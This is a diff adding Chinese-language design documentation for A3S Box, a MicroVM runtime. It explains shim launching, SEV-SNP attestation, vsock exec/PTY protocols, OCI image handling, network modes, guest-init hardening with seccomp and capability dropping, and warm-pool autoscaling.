+        #[cfg(target_os = "macos")]
+        ensure_entitlement(&shim_path)?;
+  
+        // 3. 序列化配置
+        let config_json = serde_json::to_string(&spec)?;
+  
+        // 4. 启动 shim 子进程
+        let child = Command::new(&shim_path)
+            .arg("--config")
+            .arg(&config_json)
+            .stdin(Stdio::null())
+            .spawn()?;
+  
+        // 5. 返回 ShimHandler
+        Ok(Box::new(ShimHandler::from_child(child)?))
+    }
+}
+```
+
+**Shim 定位策略**（`find_shim`）按优先级搜索：
+
+1. 与当前可执行文件同目录
+2. `~/.a3s/bin/` 用户目录
+3. `target/debug` 或 `target/release`（开发模式）
+4. 系统 `PATH`
+
+这种多级搜索策略确保了在开发、测试和生产环境中都能正确找到 shim 二进制。
+
+### 9.3 macOS Entitlement 签名
+
+在 macOS 上，使用 Apple Hypervisor Framework（HVF）需要二进制文件具有 `com.apple.security.hypervisor` entitlement。A3S Box 自动处理这一需求：
+
+```rust
+fn ensure_entitlement(shim_path: &Path) -> Result<()> {
+    // 使用文件锁防止并发签名竞争
+    let lock = FileLock::new(shim_path.with_extension("lock"))?;
+    let _guard = lock.lock()?;
+  
+    // 检查是否已签名
+    if has_entitlement(shim_path, "com.apple.security.hypervisor")? {
+        return Ok(());
+    }
+  
+    // 使用 codesign 签名
+    Command::new("codesign")
+        .args(["--sign", "-", "--entitlements", entitlements_plist, 
+               "--force", shim_path.to_str().unwrap()])
+        .status()?;
+  
+    Ok(())
+}
+```
+
+文件锁机制确保了在多个 A3S Box 实例同时启动时不会出现签名竞争条件。
+
+### 9.4 优雅关闭与强制终止
+
+VM 的关闭遵循两阶段协议：
+
+1. **优雅关闭**：向 shim 进程发送配置的信号（默认 SIGTERM），然后每 50ms 轮询一次 `try_wait()`，最多等待 `timeout_ms`（默认 10,000ms）。
+2. **强制终止**：如果超时仍未退出，升级为 SIGKILL。
+3. **退出码收集**：通过 `wait()` 收集子进程退出码。
+
+对于 attached 模式（没有 Child handle 的情况），使用 `libc::waitpid` 配合 `WNOHANG` 标志进行非阻塞轮询。
+
+---
+
+## 10. TEE 机密计算：从硬件到应用的信任链
+
+### 10.1 信任链的构建
+
+机密计算的核心挑战是：**如何在不信任宿主机的前提下，建立对 MicroVM 内部运行环境的信任？**
+
+A3S Box 通过以下信任链解决这个问题：
+
+```
+AMD 硅片 (物理硬件)
+    │
+    ├── PSP (Platform Security Processor)
+    │   └── 管理每个 VM 的 AES 加密密钥
+    │
+    ├── ARK (AMD Root Key) — 硬编码在芯片中
+    │   └── ASK (AMD SEV Key) — 中间 CA
+    │       └── VCEK (Versioned Chip Endorsement Key) — 芯片唯一
+    │           └── SNP Report Signature — 证明报告签名
+    │
+    └── Measurement (SHA-384)
+        └── 初始客户机内存的哈希值
+            └── 证明 VM 启动时加载的代码未被篡改
+```
+
+这条信任链的根锚是 AMD 的物理硅片——这是无法被软件伪造的。从硅片到证明报告，每一步都有密码学保证。
+
+### 10.2 证明策略引擎
+
+A3S Box 实现了灵活的证明策略引擎（`AttestationPolicy`），允许验证方根据自己的安全需求定制验证规则：
+
+```rust
+pub struct AttestationPolicy {
+    /// 期望的初始内存哈希（SHA-384）
+    pub expected_measurement: Option<[u8; 48]>,
+  
+    /// 最低 TCB 版本要求
+    pub min_tcb: Option<TcbVersion>,
+  
+    /// 是否要求非调试模式（生产环境应为 true）
+    pub require_no_debug: bool,
+  
+    /// 是否要求禁用 SMT（防止侧信道攻击）
+    pub require_no_smt: bool,
+  
+    /// 允许的策略掩码
+    pub allowed_policy_mask: Option<u64>,
+  
+    /// 报告最大有效期（秒）
+    pub max_report_age_secs: Option<u64>,
+}
+```
+
+策略验证返回 `PolicyResult`，包含通过/失败状态和具体的违规列表（`Vec<PolicyViolation>`）。这种设计允许验证方精确了解哪些策略被违反，而不是简单的"通过/失败"。
+
+### 10.3 重新证明机制
+
+TEE 环境的安全性不是一次性的——它需要持续验证。A3S Box 实现了周期性重新证明（Re-attestation）机制：
+
+```rust
+pub struct ReattestConfig {
+    /// 检查间隔（默认 300 秒）
+    pub interval_secs: u64,
+  
+    /// 最大连续失败次数（默认 3）
+    pub max_failures: u32,
+  
+    /// 启动后的宽限期（默认 60 秒）
+    pub grace_period_secs: u64,
+}
+```
+
+重新证明的状态追踪包括：启动时间、上次成功时间、上次检查时间、连续失败次数和总计数。当连续失败次数达到阈值时，系统根据配置执行相应动作：
+
+- **Warn**：记录警告日志和事件
+- **Event**：发送安全事件到事件总线
+- **Stop**：停止 MicroVM
+
+### 10.4 密钥注入流程
+
+在 TEE 环境中，密钥不能通过普通的环境变量或文件挂载传递（因为宿主机不可信）。A3S Box 通过 RA-TLS 实现安全的密钥注入：
+
+1. MicroVM 启动后，Attestation 服务器在 vsock 端口 4091 上监听
+2. 密钥管理服务（KBS）通过 RA-TLS 连接到 MicroVM
+3. TLS 握手过程中，MicroVM 的证书包含 SNP 证明报告
+4. KBS 验证证明报告（measurement、TCB 版本、策略合规性）
+5. 验证通过后，KBS 通过加密通道发送密钥
+6. Guest Init 将密钥写入 `/run/secrets/`（tmpfs，权限 0400）
+7. 应用进程从 `/run/secrets/` 读取密钥
+
+整个过程中，密钥从未以明文形式出现在 MicroVM 外部。
+
+---
+
+## 11. Vsock 通信协议：宿主与客户机的桥梁
+
+### 11.1 为什么选择 vsock？
+
+在 MicroVM 架构中，宿主机和客户机之间需要一个高效的通信通道。传统的选择包括：
+
+- **网络（TCP/IP）**：需要配置虚拟网络接口，增加了复杂性和攻击面
+- **共享内存**：高性能但难以安全地实现
+- **串口**：简单但带宽极低
+- **vsock（Virtio Socket）**：专为 VM 通信设计的 socket 接口，无需网络配置
+
+vsock 的优势在于：
+
+1. **零配置**：不需要 IP 地址、路由表或防火墙规则
+2. **安全**：通信通道不经过网络栈，无法被网络层的攻击者截获
+3. **高性能**：基于 virtio 的共享内存传输，延迟极低
+4. **简单**：使用标准的 socket API（`AF_VSOCK`），编程模型与 TCP 相似
+
+### 11.2 端口分配
+
+A3S Box 在 vsock 上分配了四个专用端口：
+
+| 端口 | 服务               | 方向       | 协议            |
+| ---- | ------------------ | ---------- | --------------- |
+| 4088 | gRPC Agent 控制    | 双向       | Protobuf        |
+| 4089 | Exec 服务器        | 宿主→客户 | JSON + 二进制帧 |
+| 4090 | PTY 服务器         | 双向       | 二进制帧        |
+| 4091 | Attestation 服务器 | 宿主→客户 | RA-TLS          |
+
+### 11.3 二进制帧协议
+
+Exec 和 PTY 服务器使用统一的二进制帧格式：
+
+```
+┌──────────┬──────────────┬─────────────────────┐
+│ type: u8 │ length: u32  │ payload: [u8; len]  │
+│ (1 byte) │ (4 bytes BE) │ (variable length)   │
+└──────────┴──────────────┴─────────────────────┘
+```
+
+最大帧载荷为 64 KiB。这个限制是经过权衡的：足够大以高效传输数据，又足够小以避免内存压力。
+
+### 11.4 Exec 协议详解
+
+Exec 协议支持两种模式：
+
+**非流式模式**：适用于短命令（如 `cat /etc/hostname`）
+
+```
+宿主 ──→ [ExecRequest JSON] ──→ 客户
+宿主 ←── [ExecOutput JSON]  ←── 客户
+
+ExecRequest {
+    cmd: ["cat", "/etc/hostname"],
+    timeout_ns: 5_000_000_000,  // 5 秒
+    env: {"KEY": "VALUE"},
+    working_dir: "/app",
+    user: "nobody",
+    streaming: false
+}
+
+ExecOutput {
+    stdout: "my-hostname\n",
+    stderr: "",
+    exit_code: 0
+}
+```
+
+每个流（stdout/stderr）最大 16 MiB。
+
+**流式模式**：适用于长时间运行的命令或需要实时输出的场景
+
+```
+宿主 ──→ [ExecRequest JSON, streaming: true] ──→ 客户
+宿主 ←── [ExecChunk: type=0x01, Stdout]       ←── 客户
+宿主 ←── [ExecChunk: type=0x01, Stderr]       ←── 客户
+宿主 ←── [ExecChunk: type=0x01, Stdout]       ←── 客户
+...
+宿主 ←── [ExecExit: type=0x02, exit_code]     ←── 客户
+```
+
+流式模式还支持文件传输：
+
+```
+FileRequest {
+    op: Upload | Download,
+    guest_path: "/data/file.txt",
+    data: "base64_encoded_content"  // Upload 时
+}
+```
+
+### 11.5 PTY 协议详解
+
+PTY 协议为交互式终端会话设计，支持完整的终端仿真：
+
+```
+帧类型:
+  0x01 - Request  (宿主→客户: 启动 PTY 会话)
+  0x02 - Data     (双向: 终端数据)
+  0x03 - Resize   (宿主→客户: 终端窗口大小变更)
+  0x04 - Exit     (客户→宿主: 进程退出)
+  0x05 - Error    (客户→宿主: 错误信息)
+```
+
+PTY 会话的建立流程：
+
+1. 宿主发送 `PtyRequest`（包含命令、环境变量、初始窗口大小）
+2. Guest Init 调用 `openpty()` 分配 PTY 对
+3. `fork()` 创建子进程：
+   - 子进程：`setsid()` → 设置控制终端 → 重定向 stdio → `execvp()`
+   - 父进程：通过 `poll()` 多路复用 vsock ↔ PTY master 的双向数据转发
+4. 终端窗口大小变更通过 `TIOCSWINSZ` ioctl 传递
+5. 子进程退出时，排空 PTY 缓冲区，发送 `PtyExit` 帧
+
+这种设计使得 `a3s-box exec -it my-app /bin/bash` 的体验与 `docker exec -it` 完全一致——支持 Tab 补全、方向键历史、Ctrl+C 信号传递、窗口大小自适应等所有终端特性。
+
+---
+
+## 12. OCI 镜像处理管线：从注册表到根文件系统
+
+### 12.1 镜像拉取的完整链路
+
+OCI（Open Container Initiative）镜像是容器生态的通用语言。A3S Box 完整实现了 OCI 镜像规范，使得任何符合标准的容器镜像都可以直接在 MicroVM 中运行。
+
+镜像拉取的完整流程如下：
+
+```
+用户请求 (a3s-box pull nginx:latest)
+    │
+    ▼
+ImageReference 解析
+    │  registry: registry-1.docker.io
+    │  repository: library/nginx
+    │  tag: latest
+    │
+    ▼
+ImagePuller (缓存优先策略)
+    │
+    ├── 命中缓存？ ──→ 直接返回本地路径
+    │       │
+    │       ├── 按 reference 查找 (tag 匹配)
+    │       └── 按 digest 查找 (内容去重)
+    │
+    └── 未命中 ──→ RegistryPuller
+                    │
+                    ├── 认证 (RegistryAuth)
+                    │   ├── Anonymous
+                    │   ├── Basic (username/password)
+                    │   ├── 环境变量 (REGISTRY_USERNAME/PASSWORD)
+                    │   └── CredentialStore (Docker config.json)
+                    │
+                    ├── 多架构解析 (linux_platform_resolver)
+                    │   ├── x86_64 → amd64
+                    │   └── aarch64 → arm64
+                    │
+                    ├── 拉取 manifest + config + layers
+                    │
+                    └── 存入 ImageStore
+                        └── 容量淘汰 (LRU)
+```
+
+### 12.2 镜像引用解析
+
+`ImageReference` 是镜像标识的核心类型，负责将用户输入的各种格式解析为标准化的结构：
+
+```rust
+pub struct ImageReference {
+    pub registry: String,      // e.g., "registry-1.docker.io"
+    pub repository: String,    // e.g., "library/nginx"
+    pub tag: Option<String>,   // e.g., "latest"
+    pub digest: Option<String>, // e.g., "sha256:abc..."
+}
+```
+
+解析规则兼容 Docker 的约定：
+
+- `nginx` → `registry-1.docker.io/library/nginx:latest`
+- `myuser/myapp:v2` → `registry-1.docker.io/myuser/myapp:v2`
+- `ghcr.io/org/tool:main` → 保持原样
+- `registry.example.com/app@sha256:abc...` → digest 引用
+
+### 12.3 多架构镜像解析
+
+现代容器镜像通常是多架构的——同一个 tag 下包含 amd64、arm64 等多个平台的变体。A3S Box 的 `linux_platform_resolver` 自动选择与宿主机架构匹配的变体：
+
+- 操作系统固定为 `linux`（MicroVM 内部始终运行 Linux 内核）
+- 架构映射：`x86_64` → `amd64`，`aarch64` → `arm64`
+
+这意味着即使在 Apple Silicon Mac 上开发，A3S Box 也会自动拉取 arm64 变体的镜像。
+
+### 12.4 缓存与去重
+
+`ImageStore` 实现了两级缓存查找：
+
+1. **按引用查找**：精确匹配 `registry/repository:tag`，适用于重复拉取同一镜像
+2. **按摘要查找**：通过 SHA-256 内容哈希去重，避免不同 tag 指向相同内容时的重复存储
+
+缓存配置（`CacheConfig`）：
+
+| 参数                   | 默认值           | 说明                   |
+| ---------------------- | ---------------- | ---------------------- |
+| `enabled`            | `true`         | 是否启用缓存           |
+| `cache_dir`          | `~/.a3s/cache` | 缓存目录               |
+| `max_rootfs_entries` | `10`           | 最大 rootfs 缓存条目数 |
+| `max_cache_bytes`    | `10 GB`        | 最大缓存总大小         |
+
+当缓存超出限制时，采用 LRU（Least Recently Used）策略淘汰最久未使用的条目。
+
+### 12.5 Rootfs 构建
+
+从 OCI 镜像到 MicroVM 可用的根文件系统，`OciRootfsBuilder` 执行以下步骤：
+
+1. **层解压**：按顺序解压 OCI 镜像的各个层（layer），处理 whiteout 文件（`.wh.` 前缀）以实现层间文件删除
+2. **基础文件系统注入**：创建 MicroVM 运行所需的基础文件：
+   - `/etc/passwd`：包含 `root` 和 `nobody` 用户
+   - `/etc/group`：基础用户组
+   - `/etc/hosts`：localhost 映射
+   - `/etc/resolv.conf`：DNS 配置（默认 `8.8.8.8`、`8.8.4.4`）
+   - `/etc/nsswitch.conf`：名称服务切换配置
+3. **目录结构创建**：确保 `/dev`、`/proc`、`/sys`、`/tmp`、`/etc`、`/workspace`、`/run` 等目录存在
+4. **Guest Layout 配置**：设置 `workspace_dir`、`tmp_dir`、`run_dir` 的路径映射
+
+### 12.6 镜像签名验证
+
+A3S Box 提供了镜像签名验证框架，通过 `SignaturePolicy` 控制验证行为：
+
+```rust
+pub enum SignaturePolicy {
+    Skip,           // 跳过验证（默认）
+    RequireSigned,  // 要求签名
+    Custom(String), // 自定义策略
+}
+
+pub enum VerifyResult {
+    Ok,             // 签名有效
+    NoSignature,    // 无签名
+    Failed(String), // 验证失败
+    Skip,           // 跳过验证
+}
+```
+
+默认策略为 `Skip`，允许用户在不配置签名基础设施的情况下正常使用。在生产环境中，建议启用 `RequireSigned` 以确保只运行经过签名验证的镜像。
+
+### 12.7 镜像推送
+
+`RegistryPusher` 支持将本地构建的 OCI 镜像布局推送到远程注册表，返回 `PushResult`：
+
+```rust
+pub struct PushResult {
+    pub config_url: String,    // 配置 blob 的 URL
+    pub manifest_url: String,  // manifest 的 URL
+}
+```
+
+推送流程遵循 OCI Distribution Spec：先上传 config blob 和各层 blob，最后上传 manifest。
+
+---
+
+## 13. 网络架构：三种模式的灵活选择
+
+### 13.1 网络模式概览
+
+MicroVM 的网络配置是一个需要在安全性、性能和易用性之间权衡的问题。A3S Box 提供了三种网络模式，覆盖从开发到生产的不同场景：
+
+```rust
+pub enum NetworkMode {
+    Tsi,                        // 默认：透明 socket 代理
+    Bridge { network: String }, // 桥接：真实网络接口
+    None,                       // 无网络
+}
+```
+
+### 13.2 TSI 模式（默认）
+
+TSI（Transparent Socket Interception）是 A3S Box 的默认网络模式。在这种模式下，MicroVM 内部的 socket 系统调用被透明地代理到宿主机——MicroVM 不需要自己的网络接口、IP 地址或路由表。
+
+工作原理：
+
+```
+MicroVM 内部                    宿主机
+┌──────────────┐              ┌──────────────┐
+│ 应用调用       │              │              │
+│ connect()    │──── vsock ──→│ 代理 connect()│──→ 目标服务器
+│ send()       │──── vsock ──→│ 代理 send()   │──→
+│ recv()       │←── vsock ────│ 代理 recv()   │←──
+└──────────────┘              └──────────────┘
+```
+
+TSI 的优势：
+
+- **零配置**：不需要创建网络、分配 IP、配置路由
+- **安全**：MicroVM 没有直接的网络接口，减少了攻击面
+- **简单**：适合大多数开发和测试场景
+
+TSI 的局限：
+
+- 不支持 MicroVM 之间的直接通信
+- 不支持监听端口（入站连接需要端口映射）
+- 性能略低于桥接模式（多了一层代理）
+
+### 13.3 Bridge 模式
+
+Bridge 模式为 MicroVM 提供真实的网络接口（`eth0`），通过 `passt` 守护进程实现用户空间网络栈。这种模式适合需要 MicroVM 间通信或需要完整网络功能的场景。
+
+```
+MicroVM A                     宿主机                      MicroVM B
+┌──────────┐                ┌──────────┐                ┌──────────┐
+│ eth0     │                │ PasstMgr │                │ eth0     │
+│ 10.0.1.2 │←── virtio ──→│ Bridge   │←── virtio ──→│ 10.0.1.3 │
+└──────────┘                └──────────┘                └──────────┘
+```
+
+Bridge 模式的网络配置通过环境变量注入到 Guest Init：
+
+| 环境变量            | 说明               | 示例            |
+| ------------------- | ------------------ | --------------- |
+| `A3S_NET_IP`      | MicroVM 的 IP 地址 | `10.0.1.2/24` |
+| `A3S_NET_GATEWAY` | 网关地址           | `10.0.1.1`    |
+| `A3S_NET_DNS`     | DNS 服务器         | `8.8.8.8`     |
+
+Guest Init 在启动时通过原始系统调用（不依赖 `iproute2`）配置网络接口。
+
+### 13.4 网络配置与 IPAM
+
+`NetworkConfig` 定义了一个完整的网络：
+
+```rust
+pub struct NetworkConfig {
+    pub name: String,
+    pub subnet: String,           // CIDR 格式，如 "10.0.1.0/24"
+    pub gateway: Ipv4Addr,        // 网关地址
+    pub driver: String,           // 默认 "bridge"
+    pub labels: HashMap<String, String>,
+    pub endpoints: HashMap<String, NetworkEndpoint>,
+    pub policy: NetworkPolicy,
+    pub created_at: DateTime<Utc>,
+}
+```
+
+IPAM（IP Address Management）模块负责自动分配 IP 地址：
+
+- **IPv4 IPAM**（`Ipam`）：从 CIDR 中顺序分配，跳过网络地址、网关地址和广播地址。支持前缀长度 ≤ 30 的子网。
+- **IPv6 IPAM**（`Ipam6`）：支持前缀长度 64–120 的 IPv6 子网。
+
+MAC 地址生成采用 Docker 兼容的确定性算法：从 IP 地址派生，使用 `02:42:xx:xx:xx:xx` 前缀。这确保了相同 IP 始终映射到相同的 MAC 地址，避免了 ARP 缓存不一致的问题。
+
+### 13.5 网络策略
+
+`NetworkPolicy` 提供了 MicroVM 间的网络隔离控制：
+
+```rust
+pub struct NetworkPolicy {
+    pub isolation: IsolationMode,
+    pub ingress: Vec<PolicyRule>,
+    pub egress: Vec<PolicyRule>,
+}
+
+pub enum IsolationMode {
+    None,    // 默认：所有 MicroVM 可互相通信
+    Strict,  // 完全隔离：禁止 MicroVM 间通信
+    Custom,  // 自定义：基于规则的访问控制
+}
+```
+
+`PolicyRule` 支持灵活的规则定义：
+
+```rust
+pub struct PolicyRule {
+    pub from: String,       // 源（支持通配符 "*"）
+    pub to: String,         // 目标
+    pub ports: Vec<u16>,    // 端口列表
+    pub protocol: String,   // "tcp" / "udp" / "any"
+    pub action: PolicyAction, // Allow / Deny
+}
+```
+
+Custom 模式采用 first-match-wins 规则评估策略，默认拒绝未匹配的流量。
+
+### 13.6 DNS 发现
+
+在 Bridge 模式下，同一网络中的 MicroVM 可以通过 DNS 名称互相发现。`NetworkConfig` 提供了两个关键方法：
+
+- `peer_endpoints()`：返回同一网络中除自身外的所有端点
+- `allowed_peer_endpoints()`：在 `peer_endpoints()` 基础上应用网络策略过滤
+
+这使得微服务架构中的服务发现变得简单——每个 MicroVM 可以通过名称找到同一网络中的其他服务。
+
+### 13.7 None 模式
+
+`None` 模式完全禁用网络——MicroVM 没有任何网络接口，无法进行任何网络通信。这适用于纯计算型工作负载（如数据处理、密码学运算），或者安全要求极高、需要完全网络隔离的场景。
+
+---
+
+## 14. Guest Init：MicroVM 内部的 PID 1
+
+### 14.1 为什么需要自定义 PID 1？
+
+在传统 Linux 系统中，PID 1 通常是 systemd 或 SysVinit——它们负责挂载文件系统、启动服务、管理进程生命周期。但这些通用的 init 系统对于 MicroVM 来说过于庞大：systemd 本身就有数百万行代码，引入了不必要的复杂性和攻击面。
+
+A3S Box 的 `a3s-box-guest-init` 是一个专为 MicroVM 设计的极简 PID 1。它被编译为静态链接的 Rust 二进制，不依赖任何动态库（libc、libssl 等），最大限度地减少了攻击面和启动时间。
+
+### 14.2 启动序列详解
+
+Guest Init 的启动序列是一个精心编排的 12 步流程：
+
+```
+[Step 1]  挂载基础文件系统
+          ├── /proc  (procfs)   — 进程信息
+          ├── /sys   (sysfs)    — 内核/设备信息
+          └── /dev   (devtmpfs) — 设备节点
+          注：忽略 EBUSY 错误（内核可能已预挂载）
+
+[Step 2]  挂载 virtio-fs 共享文件系统
+          ├── /workspace — 宿主机传入的 rootfs
+          └── 用户卷 — 通过 BOX_VOL_<index>=<tag>:<guest_path>[:ro] 配置
+
+[Step 3]  挂载 tmpfs
+          └── 通过 BOX_TMPFS_<index>=<path>[:<options>] 配置
+
+[Step 4]  配置客户机网络
+          └── configure_guest_network()
+              ├── TSI 模式：无需配置
+              └── Bridge 模式：通过原始系统调用配置 eth0
+
+[Step 5]  只读 rootfs（可选）
+          └── 如果 BOX_READONLY=1，重新挂载 rootfs 为只读
+
+[Step 6]  注册信号处理器
+          └── SIGTERM → 设置 SHUTDOWN_REQUESTED (AtomicBool)
+
+[Step 7]  解析执行配置
+          ├── BOX_EXEC_EXEC    — 可执行文件路径
+          ├── BOX_EXEC_ARGC    — 参数数量
+          ├── BOX_EXEC_ARG_<n> — 各参数
+          ├── BOX_EXEC_ENV_*   — 环境变量
+          └── BOX_EXEC_WORKDIR — 工作目录
+
+[Step 8]  启动容器进程
+          └── namespace::spawn_isolated()
+
+[Step 9]  启动 Exec 服务器线程
+          └── vsock 端口 4089
+
+[Step 10] 启动 PTY 服务器线程
+          └── vsock 端口 4090
+
+[Step 11] 启动 Attestation 服务器线程（仅 TEE 模式）
+          └── vsock 端口 4091
+
+[Step 12] 进入主循环
+          └── 收割僵尸进程 + 处理 SIGTERM
+```
+
+### 14.3 进程隔离策略
+
+在 MicroVM 内部，Guest Init 通过 `namespace::spawn_isolated()` 启动容器进程。值得注意的是，MicroVM 内部的命名空间隔离是**可选的**——因为 VM 边界本身已经提供了硬件级隔离。
+
+`NamespaceConfig` 定义了七种命名空间标志：
+
+| 命名空间 | 作用           | 默认启用 |
+| -------- | -------------- | -------- |
+| Mount    | 文件系统隔离   | ✅       |
+| PID      | 进程 ID 隔离   | ✅       |
+| IPC      | 进程间通信隔离 | ✅       |
+| UTS      | 主机名隔离     | ✅       |
+| Net      | 网络隔离       | ❌       |
+| User     | 用户 ID 隔离   | ❌       |
+| Cgroup   | cgroup 隔离    | ❌       |
+
+三种预设配置：
+
+- `default()`：Mount + PID + IPC + UTS（推荐）
+- `full_isolation()`：全部七种命名空间
+- `minimal()`：仅 Mount + PID
+
+### 14.4 安全策略应用
+
+在 `execvp()` 之前，Guest Init 应用三层安全策略：
+
+**第一层：PR_SET_NO_NEW_PRIVS**
+
+通过 `prctl(PR_SET_NO_NEW_PRIVS, 1)` 确保进程及其子进程无法通过 `execve()` 获得新的特权。这防止了 SUID/SGID 二进制的特权提升。
+
+**第二层：Capability 剥离**
+
+Linux Capabilities 将传统的 root 全权拆分为 41 个细粒度的能力（从 `CAP_CHOWN`(0) 到 `CAP_CHECKPOINT_RESTORE`(40)）。Guest Init 默认剥离所有 Capability：
+
+```rust
+// 剥离所有 41 个 Capability
+for cap in 0..=40 {
+    libc::prctl(libc::PR_CAPBSET_DROP, cap);
+}
+// 清除 ambient 和 inheritable 集合
+libc::prctl(libc::PR_CAP_AMBIENT, libc::PR_CAP_AMBIENT_CLEAR_ALL);
+```
+
+用户可以通过 `--cap-add` 和 `--cap-drop` 选择性地添加或移除特定 Capability。
+
+**第三层：Seccomp BPF 过滤器**
+
+Seccomp（Secure Computing Mode）通过 BPF（Berkeley Packet Filter）程序过滤系统调用。A3S Box 的默认 Seccomp 策略阻止 16 个危险的系统调用：
+
+| 系统调用                                               | 阻止原因                           |
+| ------------------------------------------------------ | ---------------------------------- |
+| `kexec_load` / `kexec_file_load`                   | 防止加载新内核                     |
+| `reboot`                                             | 防止重启系统                       |
+| `swapon` / `swapoff`                               | 防止操纵交换空间                   |
+| `init_module` / `finit_module` / `delete_module` | 防止加载/卸载内核模块              |
+| `acct`                                               | 防止启用进程记账                   |
+| `settimeofday` / `clock_settime`                   | 防止修改系统时间                   |
+| `personality`                                        | 防止改变执行域                     |
+| `keyctl`                                             | 防止操纵内核密钥环                 |
+| `perf_event_open`                                    | 防止性能监控（侧信道风险）         |
+| `bpf`                                                | 防止加载 BPF 程序                  |
+| `userfaultfd`                                        | 防止用户空间页错误处理（利用风险） |
+
+Seccomp 过滤器还包含架构验证：仅允许 x86_64（`0xC000_003E`）或 aarch64（`0xC000_00B7`）架构的系统调用，防止通过 32 位兼容模式绕过过滤器。
+
+### 14.5 优雅关闭
+
+当收到 SIGTERM 信号时，Guest Init 执行优雅关闭流程：
+
+1. 设置 `SHUTDOWN_REQUESTED` 标志
+2. 向所有子进程转发 SIGTERM
+3. 等待子进程退出（超时 `CHILD_SHUTDOWN_TIMEOUT_MS = 5000ms`）
+4. 超时后对仍存活的子进程发送 SIGKILL
+5. 调用 `libc::sync()` 刷新文件系统缓冲区
+6. 以容器进程的退出码退出（信号终止时为 `128 + signal`）
+
+这种两阶段关闭确保了应用有机会执行清理操作（如关闭数据库连接、刷新日志），同时保证了关闭过程不会无限期挂起。
+
+---
+
+## 15. 暖池机制：消除冷启动的终极方案
+
+### 15.1 冷启动问题的本质
+
+即使 A3S Box 已经将 MicroVM 的冷启动时间优化到约 200ms，在某些场景下这仍然不够：
+
+- **实时 API 服务**：P99 延迟要求 < 100ms，200ms 的冷启动会导致首次请求超时
+- **交互式 AI Agent**：用户期望即时响应，任何可感知的延迟都会降低体验
+- **突发流量**：短时间内大量请求到达，串行启动 VM 会导致请求堆积
+
+暖池（Warm Pool）通过预先启动一批 MicroVM 来解决这个问题——当请求到来时，直接分配一个已就绪的 VM，实现接近零延迟的响应。
+
+### 15.2 暖池架构
+
+```
+                    ┌─────────────────────────────┐
+                    │         WarmPool             │
+                    │                              │
+  acquire() ──────→ │  ┌─────┐ ┌─────┐ ┌─────┐   │
+  (获取 VM)         │  │ VM1 │ │ VM2 │ │ VM3 │   │ ← 空闲 VM 队列
+                    │  │Ready│ │Ready│ │Ready│   │
+  release() ──────→ │  └─────┘ └─────┘ └─────┘   │
+  (归还 VM)         │                              │
+                    │  ┌──────────────────────┐    │
+                    │  │  Background Task      │    │
+                    │  │  • 淘汰过期 VM         │    │
+                    │  │  • 补充低于 min_idle   │    │
+                    │  │  • 自动扩缩容          │    │
+                    │  └──────────────────────┘    │
+                    │                              │
+                    │  ┌──────────────────────┐    │
+                    │  │  PoolScaler           │    │
+                    │  │  • 滑动窗口统计        │    │
+                    │  │  • 动态调整 min_idle   │    │
+                    │  └──────────────────────┘    │
+                    └─────────────────────────────┘
+```
+
+### 15.3 核心配置
+
+`PoolConfig` 定义了暖池的行为参数：
+
+```rust
+pub struct PoolConfig {
+    pub enabled: bool,          // 默认 false
+    pub min_idle: usize,        // 最小空闲 VM 数量，默认 1
+    pub max_size: usize,        // 池中最大 VM 数量，默认 5
+    pub idle_ttl_secs: u64,     // 空闲 VM 存活时间，默认 300 秒
+}
+```
+
+| 参数              | 默认值 | 调优建议                               |
+| ----------------- | ------ | -------------------------------------- |
+| `min_idle`      | 1      | 根据平均并发量设置，过高浪费资源       |
+| `max_size`      | 5      | 根据宿主机内存设置，每个 VM 约 512 MiB |
+| `idle_ttl_secs` | 300    | 流量稀疏时缩短以节省资源               |
+
+### 15.4 获取与归还
+
+暖池的核心操作是 `acquire()` 和 `release()`：
+
+**acquire()（获取 VM）**：
+
+1. 尝试从空闲队列中弹出一个 Ready 状态的 VM
+2. 如果命中（hit），记录命中统计，直接返回
+3. 如果未命中（miss），记录未命中统计，按需启动新 VM（慢路径）
+
+**release()（归还 VM）**：
+
+1. 检查池是否已满（当前数量 ≥ max_size）
+2. 未满：将 VM 放回空闲队列，重置创建时间
+3. 已满：销毁 VM
+
+命中/未命中统计是自动扩缩容的关键输入。
+
+### 15.5 自动扩缩容
+
+`PoolScaler` 基于滑动窗口内的命中率动态调整 `min_idle`，实现自适应的资源管理：
+
+```rust
+pub struct ScalingPolicy {
+    pub enabled: bool,
+    pub scale_up_threshold: f64,    // 默认 0.3（30% 未命中率触发扩容）
+    pub scale_down_threshold: f64,  // 默认 0.05（5% 未命中率触发缩容）
+    pub max_min_idle: usize,        // min_idle 的上限
+    pub cooldown_secs: u64,         // 冷却期，默认 60 秒
+    pub window_secs: u64,           // 统计窗口，默认 120 秒
+}
+```
+
+扩缩容决策逻辑：
+
+```
+计算滑动窗口内的未命中率 = miss_count / (hit_count + miss_count)
+
+如果 未命中率 > scale_up_threshold (0.3):
+    effective_min_idle += 1  (不超过 max_min_idle)
+    进入冷却期
+
+如果 未命中率 < scale_down_threshold (0.05):
+    effective_min_idle -= 1  (不低于配置的 min_idle)
+    进入冷却期
+```
+
+冷却期（默认 60 秒）防止在流量波动时频繁调整，避免"振荡"现象。
+
+### 15.6 后台维护
+
+暖池启动一个后台异步任务，以 `max(idle_ttl / 5, 5s)` 的间隔执行维护操作：
+
+1. **评估自动扩缩容**：调用 `PoolScaler` 计算新的 `effective_min_idle`
+2. **淘汰过期 VM**：检查每个空闲 VM 的存活时间，超过 `idle_ttl_secs` 的予以销毁
+3. **补充 VM**：如果空闲 VM 数量低于 `effective_min_idle`，启动新的 VM 补充
+
+### 15.7 事件追踪
+
+暖池的所有关键操作都会发出事件，便于监控和调试：
+
+| 事件                 | 触发时机             |
+| -------------------- | -------------------- |
+| `pool.vm.acquired` | VM 被获取            |
+| `pool.vm.released` | VM 被归还            |
+| `pool.vm.created`  | 新 VM 被创建         |
+| `pool.vm.evicted`  | VM 因过期被淘汰      |
+| `pool.replenish`   | 补充 VM              |
+| `pool.autoscale`   | 自动扩缩容触发       |
+| `pool.drained`     | 暖池被排空（关闭时） |
+
+### 15.8 优雅排空
+
+当系统关闭时，`drain()` 方法执行优雅排空：
+
+1. 发送关闭信号给后台维护任务
+2. 等待后台任务完成
+3. 销毁所有空闲 VM
+4. 发出 `pool.drained` 事件
+
+这确保了系统关闭时不会留下孤儿 VM 进程。
+
+---
+
+## 16. 七层纵深防御安全模型
+
+### 16.1 纵深防御的哲学
+
+安全领域有一条基本原则：**没有任何单一的安全措施是完美的**。无论是加密算法、访问控制还是硬件隔离，都可能存在未知的漏洞。纵深防御（Defense in Depth）的策略是叠加多层独立的安全机制，使得攻击者必须同时突破所有层才能达成目标。
+
